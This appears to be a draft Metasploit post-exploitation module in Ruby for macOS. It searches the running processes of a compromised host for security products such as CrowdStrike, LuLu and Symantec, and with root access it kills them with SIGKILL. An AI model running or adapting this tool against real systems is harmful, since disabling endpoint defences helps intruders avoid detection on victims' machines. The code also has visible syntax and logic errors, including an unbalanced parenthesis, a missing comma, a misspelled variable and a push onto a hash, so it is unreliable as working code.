##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Process
  include Msf::Post::File
  include Msf::Post::OSX::Priv

  def initialize(info = {})
    super(
      update_info(
        info,
        'OSX Antivirus Hunter' => 'OSX Antivirus Hunter: Enumerate and disable antivirus products',
        'Description' => %q{
          This module enumerates OSX systems for the presence of antivirus and other defensive products. This module functions by enumerating 
          the running processes on a device. The CUSTOM_PRODS option specifies
          a file which contains a list of additional security products to hunt for, each of which will be seperated by a new
          line character. All searching will be done grep wise, therefore you don't need to pass in a specific file or process name. If run
          with root privilleges the KILL_PROCESSES option will send a kill signal to the security processes detected by this module.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'gardnerapp', # Team Wild Star
          'cdelafuente-r7'
        ],
        'Platform' => [ 'osx' ],
        'SessionTypes' => ['meterpreter'],
        'References' => [
          ['URL', 'https://objective-see.org/tools.html']
        ]
      )

  )

    register_options(
      [
        OptString.new('AV_FILE_LIST',
                      [
                        false,
                        'File containing a list of AV products to hunt for. Each value should be seperated by a newline character and matching will be done in a case insensitive fashion', nil
                      ]),
        OptBool.new('KILL_PROCESSES', [false, 'Send a SIGKILL signal to all of the processes this module finds, including custom processes. Root permissions are required.'])
      ]
    )
  end

  # good canidate for an acessory method
  # reads a file and returns each line as an element in an array
  def file_to_array(file)
    f = File.open file
    f.readlines.map(&chomp)
  end

  def enum_processes(product)
    @processes.each do |process|
      if process['name'].include? product.to_s
        @av_processes.push(process)
        print_good("Found potential process artifact for #{product}: #{process.inspect}")
        # following post/linux/gather/enum_protections.rb
        report_note(
          host: session,
          type: 'osx.protection',
          data: {"#{product}": process.inspect} # need to test this
          update: :unique_data
        )
      end
    end
  end

  def run
    products = ['LuLu', 'BlockBlock Helper', 'Do Not Disturb', 'ReiKey', 'RansomWhere', 'OverSight', 'CrowdStrike', 
                'Jamf', 'Netskope', 'Qualys', 'NetSkope', 'BitDefender', 'Symantec']

    print_status('Retrieving process list...')
    @processes = get_processes

    print_status('Hunting processes for AV products...')
    @av_processes = {}

    products.each do |prod|
      enum_processes prod
    end

    if datastore['AV_FILE_LIST']
      file = datastore['AV_FILE_LIST']
      av = file_to_array file
      av.each do |prod|
        enum_processes prod
      end
    end

    if datastore['KILL_PROCESSES']
      print_status "Killing AV PID's"
      fail_with(Failure::NoAccess, "Root permissions are required to kill AV processes") unless is_root?
      @av_proccess.each do |process|
        res = kill_process process['pid']
        print_status "kill signal for #{process['name']} #{process['pid']} = #{res}"
      end
    end
  end
end
